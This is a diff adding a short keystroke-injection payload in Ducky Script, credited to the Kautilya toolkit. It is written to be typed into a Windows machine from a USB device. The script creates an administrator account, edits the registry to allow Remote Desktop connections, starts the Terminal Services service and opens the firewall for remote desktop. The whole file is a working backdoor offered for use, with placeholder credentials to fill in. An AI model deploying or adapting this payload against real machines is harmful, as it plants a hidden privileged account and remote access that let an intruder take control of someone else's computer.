@@ -1,0 +1,20 @@
+REM Credit to samratashok @ https://github.com/samratashok/Kautilya/blob/master/lib/src/enable_rdp.pde
+REM This payload adds an Administrative User, Starts RDP Service and adds exception to Windows firewall.
+REM
+REM Change USERNAME and PASSWORD below
+SLEEP 3000
+GUI r
+STRING cmd.exe
+SLEEP 3000
+STRING net user USERNAME PASSWORD /add
+STRING net localgroup Administrators USERNAME /add
+SLEEP 2000
+STRING reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+SLEEP 2000
+STRING reg add \"HKLM\\System\\CurrentControlSet\\Services\\TermService\" /v Start /t REG_DWORD /d 2 /f
+SLEEP 2000
+STRING sc start termservice
+SLEEP 2000
+STRING netsh firewall set service type = remotedesktop mode = enable
+SLEEP 3000
+STRING exit
